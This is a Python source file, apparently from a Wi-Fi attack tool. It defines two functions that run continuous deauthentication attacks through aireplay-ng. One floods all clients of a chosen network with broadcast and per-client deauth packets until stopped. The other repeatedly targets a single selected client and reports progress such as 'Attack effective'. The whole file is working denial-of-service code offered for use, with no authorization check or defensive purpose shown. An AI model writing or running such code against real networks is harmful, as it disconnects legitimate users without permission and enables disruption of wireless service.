
import time
from rich.table import Table
from rich.prompt import Prompt
import subprocess



def deauth_all_clients(self):
    """Deauthenticate all clients connected to the selected network"""
    if not self.selected_network:
        self.console.print("[bold red]Please select a target network first![/]")
        return
        
    network = self.networks[self.selected_network]
    clients = network['clients']
    
    if not clients:
        self.console.print("[bold yellow]No clients connected to this network.[/]")
        return
        
    self.console.print(f"[bold yellow]Starting deauthentication attack on all clients of {network['ssid']}...[/]")
    self.console.print("[bold red]⚠️ This attack will continue until you press Ctrl+C to stop it! ⚠️[/]")
    
    # Start time of attack
    start_time = time.time()
    round_count = 0
    
    try:
        while True:  # Continue until Ctrl+C
            round_count += 1
            
            # Calculate elapsed time
            elapsed = int(time.time() - start_time)
            minutes = elapsed // 60
            seconds = elapsed % 60
            duration = f"{minutes:02d}:{seconds:02d}"
            
            # Print round header with duration
            self.console.print(f"\n[bold yellow]--- Round {round_count} | Duration: {duration} ---[/]")
            
            # Broadcast deauth
            self.console.print(f"[bold cyan]Broadcasting deauth to all clients on {network['ssid']}...[/]")
            broadcast_cmd = f"aireplay-ng -0 2 -a {self.selected_network} {self.interface_name}"
            subprocess.run(broadcast_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
            
            # Targeted deauth to each client
            self.console.print(f"[bold green]Targeting individual clients ({len(clients)}):[/]")
            
            for i, client in enumerate(clients, 1):
                deauth_cmd = f"aireplay-ng -0 2 -a {self.selected_network} -c {client} {self.interface_name}"
                subprocess.run(deauth_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
                
                # Print progress
                self.console.print(f"  [green]{i}/{len(clients)}[/] - Deauthing client: [cyan]{client}[/]")
                
                # Small delay between clients
                time.sleep(0.1)
            
            # Round complete status
            self.console.print(f"[bold yellow]Round {round_count} complete - {len(clients)} clients deauthenticated[/]")
            self.console.print("[bold red]Press Ctrl+C to stop the attack[/]")
            
            # Wait before next round
            time.sleep(1.5)
            
    except KeyboardInterrupt:
        self.console.print("\n[bold green]Deauthentication attack stopped by user![/]")
        self.logger.info(f"Deauthentication attack stopped after {round_count} rounds")
    except Exception as e:
        self.console.print(f"\n[bold red]Error during deauthentication: {str(e)}[/]")
        self.logger.error(f"Error during deauthentication: {str(e)}")




def deauth_single_client(self):
    """Deauthenticate a specific client connected to the selected network"""
    if not self.selected_network:
        self.console.print("[bold red]Please select a target network first![/]")
        return
        
    network = self.networks[self.selected_network]
    clients = network['clients']
    
    if not clients:
        self.console.print("[bold yellow]No clients connected to this network.[/]")
        return
        
    # Display connected clients
    self.console.print(f"\n[bold yellow]Clients connected to {network['ssid']}:[/]")
    client_table = Table(show_header=True, header_style="bold magenta")
    client_table.add_column("ID", style="cyan", justify="center")
    client_table.add_column("MAC Address", style="green")
    
    for idx, client in enumerate(clients, 1):
        client_table.add_row(str(idx), client)
        
    self.console.print(client_table)
    
    
    # Let user select client
    choice = Prompt.ask("Select client ID to deauthenticate (0 to cancel)", 
                        choices=["0"] + [str(i) for i in range(1, len(clients) + 1)])
    
    if choice == "0":
        return
        
    selected_client = list(clients)[int(choice) - 1]
    
    # Start time of attack
    start_time = time.time()
    packet_count = 0
    
    self.console.print(f"\n[bold yellow]Starting targeted deauthentication attack against client: {selected_client}[/]")
    self.console.print("[bold red]⚠️ This attack will continue until you press Ctrl+C to stop it! ⚠️[/]")
    
    try:
        while True:  # Continue until Ctrl+C
            packet_count += 2  # Each deauth call sends 2 packets by default
            
            # Calculate elapsed time
            elapsed = int(time.time() - start_time)
            minutes = elapsed // 60
            seconds = elapsed % 60
            duration = f"{minutes:02d}:{seconds:02d}"
            
            # Send deauth packets
            deauth_cmd = f"aireplay-ng -0 2 -a {self.selected_network} -c {selected_client} {self.interface_name}"
            subprocess.run(deauth_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
            
            # Determine status message based on packets sent
            if packet_count < 10:
                status = f"[yellow]Starting attack[/]"
            elif packet_count < 50:
                status = f"[green]Attack in progress[/]"
            else:
                status = f"[bold green]Attack effective[/]"
            
            # Print status update on a single line
            self.console.print(f"\r[cyan]Client: {selected_client}[/] | [green]Network: {network['ssid']}[/] | {status} | [blue]Packets: {packet_count}[/] | [red]Duration: {duration}[/] [bold red](Ctrl+C to stop)[/]", end="")
            
            # Small delay before next deauth
            time.sleep(1.0)
            
    except KeyboardInterrupt:
        self.console.print("\n\n[bold green]Targeted deauthentication attack stopped by user![/]")
        self.logger.info(f"Targeted deauthentication attack against {selected_client} stopped after {packet_count} packets")
    except Exception as e:
        self.console.print(f"\n\n[bold red]Error during deauthentication: {str(e)}[/]")
        self.logger.error(f"Error during deauthentication: {str(e)}")